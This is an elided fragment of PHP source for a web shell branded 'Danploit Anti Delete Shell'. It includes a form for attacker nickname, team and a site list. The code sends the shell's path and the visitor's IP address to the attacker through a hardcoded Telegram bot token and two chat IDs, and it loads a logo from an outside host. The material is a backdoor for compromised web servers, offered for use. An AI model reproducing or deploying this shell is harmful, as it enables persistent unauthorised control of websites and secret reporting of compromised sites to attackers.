    ...
    if (isset($_POST['nick']) && isset($_POST['team']) && isset($_POST['weblist'])){
        ...
        echo '<form action="" method="post">
            <div class="mb-3">
                ...
                <input type="text" class="form-control" name="nick" placeholder="DANDIER" required>
            </div>
            <div class="mb-3">
                <label class="form-label">Team</label>
                <input type="text" class="form-control" name="team" placeholder="DANDIER">
            </div>
            <div class="mb-3">
...
<html>
    <head>
        ...
        <title>Danploit Shell [ <?= $serv; ?> ]</title>
            ...
            <div class="py-3" id="main">
                <div class="p-4 rounded-3">
                    <table class="table table-borderless text-light">
                    	<center>
                    	<img src="https://kosred.com/a/ogivpn.png" alt="danploit logo" width="310">
                    <label class="form-label">Danploit Anti Delete Shell</label><br><br>
                    </center>
                        <tr>
                                    ...
                                    <td>
                                        ...
                                        <?php elseif ($dir === '.') : ?>
											...
											<?php
											    ...
											    $pesan_alert = "Result: $x_path \nIP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
											
											    $telegram_bot_token = '6308075987:AAFsffXc8BNKE6qO4rpvyXsqaBvhKmkwZCk';
											    $chat_id1 = '6321707529';
											    $chat_id2 = '6597229213';
											    ...
											    $response = file_get_contents($telegram_url . '?' . http_build_query($telegram_data));
                    ...
                    <center><div class="text-light my-1">@dandierexploit</div></center>
                </div>
            </div>
        </div>
